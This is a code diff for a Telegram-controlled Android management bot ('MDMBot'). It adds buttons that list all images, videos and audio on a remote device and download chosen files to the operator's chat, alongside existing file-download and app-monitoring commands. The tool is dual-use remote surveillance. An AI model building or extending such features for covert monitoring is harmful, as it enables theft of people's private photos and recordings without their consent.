@@ -247,6 +247,10 @@ COMMANDS = {
     # info
     "get-device-info": {"category": "info", "label": "📋 معلومات الجهاز",  "description": "معلومات تفصيلية",     "needs_param": False},
     "ls":              {"category": "info", "label": "📂 مستعرض الملفات",  "description": "تصفح ملفات الجهاز",  "needs_param": False},
+    "media-images":    {"category": "info", "label": "📷 الصور",          "description": "عرض كل الصور",       "needs_param": False},
+    "media-videos":    {"category": "info", "label": "🎥 الفيديوهات",     "description": "عرض كل الفيديوهات",  "needs_param": False},
+    "media-audio":     {"category": "info", "label": "🎵 الصوتيات",       "description": "عرض كل الملفات الصوتية", "needs_param": False},
+    "download-media":  {"category": "info", "label": "📥 تحميل وسائط",     "description": "تحميل ملف وسائط",    "needs_param": True, "param_hint": "content://..."},
     "download-file":   {"category": "info", "label": "📥 تحميل ملف",      "description": "تحميل ملف من الجهاز", "needs_param": True, "param_hint": "/sdcard/file.txt"},
     # app_monitoring
     "app-monitor-start":  {"category": "app_monitoring", "label": "🟢 تفعيل المراقبة", "description": "بدء مراقبة التطبيقات",     "needs_param": False},
@@ -420,6 +424,9 @@ def advanced_keyboard(did):
 def info_keyboard(did):
     kb = InlineKeyboardMarkup(row_width=2)
     kb.add(_cbtn(did,"get-device-info"), _cbtn(did,"ls"))
+    # ✅ Media explorer buttons (use MediaStore - "الملفات والوسائط" permission)
+    kb.add(_cbtn(did,"media-images"), _cbtn(did,"media-videos"))
+    kb.add(_cbtn(did,"media-audio"))
     kb.add(_back(did))
     return kb
 
@@ -667,6 +674,95 @@ def _format_file_list_result(dev, file_data):
     return text, kb
 
 
+def _format_media_list_result(dev, media_data):
+    """Format media file list (images/videos/audio) as inline keyboard buttons.
+
+    Uses _file_path_cache to keep callback_data under Telegram's 64-byte limit.
+    Buttons call 'mediadl' action with cached URI key.
+    """
+    did = dev.get("device_id", "")
+    short_label = _dev_label(dev)
+    media_type = media_data.get("media_type", "media")
+    files = media_data.get("files", [])
+    error = media_data.get("error", "")
+    count = media_data.get("count", 0)
+
+    # Header labels
+    type_labels = {
+        "images": "📷 الصور",
+        "videos": "🎥 الفيديوهات",
+        "audio": "🎵 الصوتيات"
+    }
+    type_label = type_labels.get(media_type, "📂 الوسائط")
+
+    kb = InlineKeyboardMarkup(row_width=1)
+
+    if error:
+        text = (
+            f"❌ <b>خطأ في جلب الوسائط</b>\n\n"
+            f"📱 <b>{short_label}</b>\n"
+            f"⚙ {type_label}\n"
+            f"━━━━━━━━━━━━━━━\n"
+            f"⚠ الخطأ: {error}\n\n"
+            f"💡 قد تحتاج منح صلاحية 'الملفات والوسائط'"
+        )
+        kb.add(_back(did))
+        return text, kb
+
+    if not files:
+        text = (
+            f"📂 <b>{type_label}</b>\n\n"
+            f"📱 <b>{short_label}</b>\n"
+            f"━━━━━━━━━━━━━━━\n"
+            f"📁 لا توجد ملفات"
+        )
+        kb.add(_back(did))
+        return text, kb
+
+    # Add file buttons
+    file_count = 0
+    for f in files:
+        name = f.get("name", "?")
+        uri = f.get("uri", "")
+        size = f.get("size", 0)
+
+        size_str = ""
+        if size > 1024 * 1024:
+            size_str = f" ({size // (1024 * 1024)}MB)"
+        elif size > 1024:
+            size_str = f" ({size // 1024}KB)"
+
+        # Use media_type-specific icon
+        icon = "📷" if media_type == "images" else ("🎥" if media_type == "videos" else "🎵")
+
+        # Cache the URI to keep callback_data short
+        cache_key = str(len(_file_path_cache))
+        _file_path_cache[cache_key] = uri
+        # Keep cache small
+        if len(_file_path_cache) > 500:
+            keys = list(_file_path_cache.keys())
+            for k in keys[:250]:
+                del _file_path_cache[k]
+
+        kb.add(InlineKeyboardButton(
+            f"{icon} {name}{size_str}",
+            callback_data=_cb(did, "mediadl", cache_key)
+        ))
+        file_count += 1
+
+    kb.add(_back(did))
+
+    text = (
+        f"📂 <b>{type_label}</b>\n\n"
+        f"📱 <b>{short_label}</b>\n"
+        f"━━━━━━━━━━━━━━━\n"
+        f"📊 عدد الملفات: {file_count}\n\n"
+        f"💡 اضغط على أي ملف لتحميله"
+    )
+
+    return text, kb
+
+
 def _format_cmd_result(dev, command, status, data=None, error=None, full_response=None):
     """Beautiful command result.
     
@@ -680,7 +776,7 @@ def _format_cmd_result(dev, command, status, data=None, error=None, full_respons
 
     if status == "success" and data:
         text_resp = str(data) if not isinstance(data, str) else data
-        
+
         # Check if this is a file_list JSON response (for file explorer)
         if command == "ls":
             try:
@@ -692,12 +788,28 @@ def _format_cmd_result(dev, command, status, data=None, error=None, full_respons
                     file_data = data
                 else:
                     file_data = _json.loads(str(data))
-                
+
                 if file_data.get("type") == "file_list":
                     return _format_file_list_result(dev, file_data)
             except:
                 pass
-        
+
+        # ✅ NEW: Check for media_list response (images/videos/audio)
+        if command in ("media-images", "media-videos", "media-audio"):
+            try:
+                import json as _json
+                if isinstance(data, str):
+                    media_data = _json.loads(data)
+                elif isinstance(data, dict):
+                    media_data = data
+                else:
+                    media_data = _json.loads(str(data))
+
+                if media_data.get("type") == "media_list":
+                    return _format_media_list_result(dev, media_data)
+            except:
+                pass
+
         if len(text_resp) > 3000:
             text_resp = text_resp[:3000] + "\n... (مقتطع)"
         return (
@@ -1031,6 +1143,12 @@ class MDMBot:
                 file_path = _resolve_file_path(tgt)
                 self._send_cmd(c.message.chat.id, did, "download-file", {"value": file_path})
                 bot.answer_callback_query(c.id, f"📥 تحميل: {file_path[:40]}")
+
+            elif a == "mediadl":
+                # ✅ NEW: Media explorer: download media file by URI (cached)
+                uri = _resolve_file_path(tgt)
+                self._send_cmd(c.message.chat.id, did, "download-media", {"value": uri})
+                bot.answer_callback_query(c.id, "📥 جاري تحميل الوسائط...")
 
             elif a == "param":
                 self._pending[c.message.chat.id] = {"device_id": did, "command": tgt}
